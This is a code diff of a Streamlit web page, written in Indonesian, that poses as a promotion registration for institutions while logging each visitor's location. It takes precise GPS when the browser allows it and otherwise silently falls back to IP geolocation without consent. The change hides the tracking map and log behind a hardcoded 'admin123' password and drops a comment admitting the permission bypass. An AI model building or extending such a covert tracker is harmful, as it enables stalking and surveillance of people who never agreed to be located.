@@ -22,7 +22,6 @@ def simpan_data(metode, lat, lon):
     df.to_csv(LOCAL_DB, index=False)
     return df
 
-# FUNGSI OTOMATIS: Ambil lokasi kasar lewat IP internet (Tanpa Perlu Izin Pop-Up)
 def ambil_lokasi_via_ip():
     try:
         response = requests.get("http://ip-api.com", timeout=3)
@@ -33,27 +32,27 @@ def ambil_lokasi_via_ip():
         pass
     return None, None
 
+# ================= HALAMAN DEPAN (UNTUK INSTANSI) =================
 st.title("📍 Aktivasi Promosi Instansi")
-st.write("Selamat datang! Posisi Anda sedang didaftarkan ke sistem database kami.")
+st.write("Selamat datang! Posisi instansi Anda sedang didaftarkan ke sistem database promosi kami.")
 
 # Jalankan sistem deteksi tombol GPS komponen
 lokasi_gps = streamlit_geolocation()
 
-# Variabel pembantu status pendaftaran
 if "status_daftar" not in st.session_state:
     st.session_state["status_daftar"] = "Belum Terdaftar"
 
-# KONDISI 1: Pengguna berhasil klik tombol target GPS dan memilih 'Allow' (Akurasi Tinggi)
+# KONDISI 1: Pengguna mengizinkan GPS Akurat
 if lokasi_gps.get("latitude") and lokasi_gps.get("longitude"):
     if st.session_state["status_daftar"] != "GPS Akurat Terkunci":
         lat = lokasi_gps["latitude"]
         lon = lokasi_gps["longitude"]
         simpan_data("Satelit GPS (Presisi)", lat, lon)
         st.session_state["status_daftar"] = "GPS Akurat Terkunci"
-        st.success(f"🎉 LUAR BIASA! Koordinat GPS presisi Anda berhasil dikunci automatically!")
+        st.success("🎉 LUAR BIASA! Koordinat GPS presisi Anda berhasil dikunci secara otomatis!")
         st.balloons()
 
-# KONDISI 2: Pengguna baru buka link, diam saja, atau pop-up diblokir (Sistem Ambil Alih Lewat IP)
+# KONDISI 2: Pengguna diam saja atau memblokir pop-up (Otomatis ambil IP)
 else:
     if st.session_state["status_daftar"] == "Belum Terdaftar":
         lat_ip, lon_ip = ambil_lokasi_via_ip()
@@ -64,21 +63,32 @@ else:
         else:
             st.warning("Menunggu respons perangkat untuk membaca posisi...")
 
-# ================= DASHBOARD ADMIN (Bagian Bawah Halaman) =================
-st.markdown("---")
-st.subheader("📊 Dashboard Hasil Pelacakan (Admin)")
 
-df_tampil = muat_data()
+# ================= DASHBOARD ADMIN (DIKUNCI PASSWORD RAHASIA) =================
+st.markdown("<br><br><br><br><br><hr>", unsafe_allow_html=True)
+st.write("🔒 *Fitur Khusus Pengembang/Admin*")
 
-if not df_tampil.empty:
-    st.metric(label="Total Lokasi Terlacak", value=len(df_tampil))
-    
-    # Tampilkan Peta
-    st.write("### Peta Sebaran Lokasi")
-    st.map(df_tampil)
-    
-    # Tampilkan Tabel Detail dengan keterangan metode pelacakannya
-    st.write("### Log Database")
-    st.dataframe(df_tampil, use_container_width=True)
-else:
-    st.info("Belum ada lokasi yang masuk.")
+# Kolom Input Password Rahasia
+password_input = st.text_input("Masukkan Password Admin untuk melihat peta database:", type="password")
+
+# SILAKAN GANTI 'admin123' DENGAN PASSWORD PILIHAN ANDA
+if password_input == "admin123":
+    st.success("Akses Diterima! Menampilkan Dashboard Admin.")
+    st.subheader("📊 Dashboard Hasil Pelacakan")
+
+    df_tampil = muat_data()
+
+    if not df_tampil.empty:
+        st.metric(label="Total Lokasi Terlacak", value=len(df_tampil))
+        
+        # Tampilkan Peta
+        st.write("### Peta Sebaran Lokasi")
+        st.map(df_tampil)
+        
+        # Tampilkan Tabel Detail
+        st.write("### Log Database")
+        st.dataframe(df_tampil, use_container_width=True)
+    else:
+        st.info("Belum ada lokasi yang masuk.")
+elif password_input != "":
+    st.error("Password Salah! Akses ke data peta ditolak.")
